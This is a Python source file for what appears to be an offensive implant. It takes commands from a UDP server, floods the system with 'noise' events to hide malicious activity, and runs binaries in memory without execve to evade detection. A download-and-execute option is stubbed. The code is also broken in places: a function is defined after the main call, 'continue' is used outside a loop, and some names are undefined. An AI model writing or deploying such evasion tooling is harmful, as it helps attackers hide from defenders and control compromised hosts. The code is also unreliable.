#!/usr/bin/env python

import socket
import os
import sys
from multiprocessing.pool import ThreadPool
import shutil

from ulexecve.ulexecve import ELFExecutor

# Default noise activiy
noise_cmd = "touch /tmp/kek"

def main():
    server_ip = '127.0.0.1'
    server_port = 12345
    bufsize = 4096

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.settimeout(10)
    server_seen = False

    # Generate events to mask off malicious activity
    noise = False
    # utilize all cores
    cpu_cores = os.cpu_count()
    pool = ThreadPool(processes=cpu_cores)

    message = "ready"

    while True:
        client_socket.sendto(message.encode(), (server_ip, server_port))
        message = "ready"

        # Receive response from the server
        try:
            response, server_address = client_socket.recvfrom(bufsize)
        except TimeoutError:
            # Server has run away. Oh no, anyways.
            pass
        else:
            cmd = response.decode().rstrip()
            print("Received from server:", cmd)
            if not server_seen:
                server_seen = True
            if cmd == "exit":
                break
            else:
                tokenized = cmd.split(None)
                print(tokenized)

                # Fill the event buffer to hide malicious activity
                if tokenized[0] == "noise":
                    if tokenized[1] == "on":
                        if noise:
                            message = "Noise is already on"
                        else:
                            noise = True
                            for x in range(cpu_cores):
                                print("launching worker")
                                pool.apply(make_noise)
                    else:
                        pool.shutdown(wait=False)
                        noise = False
                    continue

                # Execute binaries without execve system call
                elif tokenized[0] == "ulexec" or tokenized[0] == "memfd":
                    exec_res = userland_exec(tokenized)

                # Download binaries from the internet, store in memory and execute
                elif tokenized[0] == "dl":
                    # For now, this action is performed with standard TCP functions
                    # like connect() and so on. This will most likely get detected.
                    yn = input("This action is bad OPSEC. Continue? [Y/N]: ")
                    if yn != "Y":
                        continue # TODO

    # Close the connection
    client_socket.close()

def make_noise():
    while True:
        os.system(noise_cmd)

if __name__ == "__main__":
    main()

def userland_exec(tokenized):
    binpath = shutil.which(tokenized[1])
    if binpath is None:
        message = "No such binary on host"
        continue
    print("requested binary path: " + binpath)
    binfd = open(binpath, "rb")
    executor = None
    if tokenized[0] == "ulexec":
        executor = ELFExecutor(binfd, binpath)
    else:
        executor = MemFdExecutor(binfd, binpath)
    binfd.close()

    # To capture stdout of ulexec'd binary running in fork
    pipe_in, pipe_out = os.pipe()

    pid = os.fork()
    if pid == -1:
        # Could not fork for watchdog process
        sys.exit(1)
    elif pid == 0:
        os.close(pipe_in)
        os.dup2(pipe_out, 1)
        executor.execute(tokenized[2:], False, False, None)
    else:
        wait = os.wait()
        if wait[1] == 0:
            os.close(pipe_out)
            message = ""
            while True:
                output = os.read(pipe_in, bufsize).decode()
                if len(output) == 0:
                   break
                message += output
        else:
            message = "ERR"
    return message
